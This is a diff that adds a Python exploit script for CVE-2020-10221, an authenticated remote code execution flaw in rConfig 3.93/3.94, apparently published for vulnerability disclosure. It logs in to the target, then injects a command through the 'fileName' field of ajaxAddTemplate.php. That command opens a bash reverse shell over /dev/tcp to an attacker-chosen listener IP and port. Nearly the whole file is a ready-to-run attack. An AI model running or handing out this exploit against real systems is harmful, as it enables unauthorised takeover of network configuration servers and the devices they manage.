@@ -1,0 +1,50 @@
+# Exploit Title: rConfig 3.93 - 'ajaxAddTemplate.php' Authenticated Remote Code Execution
+# Date: 2020-03-08
+# Exploit Author: Engin Demirbilek
+# Vendor Homepage: https://www.rconfig.com/
+# Version: rConfig <= 3.94
+# Tested on: centOS
+# CVE: CVE-2020-10221
+# Advisory link: https://engindemirbilek.github.io/rconfig-3.93-rce
+
+import requests
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+if len(sys.argv) < 6:
+	print "Usage: ./exploit.py http(s)://url username password listenerIP listenerPort"
+	exit()
+
+url = sys.argv[1]
+user = sys.argv[2]
+password = sys.argv[3]
+payload = ";bash -i >& /dev/tcp/{}/{} 0>&1;".format(sys.argv[4], sys.argv[5])
+
+login = {
+	'user':user,
+	'pass':password,
+	'sublogin':'1'
+}
+req = requests.Session()
+print "Sendin login request ..."
+login = req.post(url+"/lib/crud/userprocess.php", data=login, verify=False)
+
+payload = {
+	'fileName':payload,
+}
+
+
+
+print "[+] Sendin exploit ..."
+
+exploit = req.post(url+"/lib/ajaxHandlers/ajaxAddTemplate.php",cookies=req.cookies, data=payload, headers={
+'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
+'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+'Accept-Encoding':'gzip, deflate',
+'Content-Type':'application/x-www-form-urlencoded'},verify=False)
+
+if exploit.status_code == 200:
+	print "[+] Everything seems ok, check your listener."
+else:
+	print "[-] Exploit failed,  system is patched or credentials are wrong."
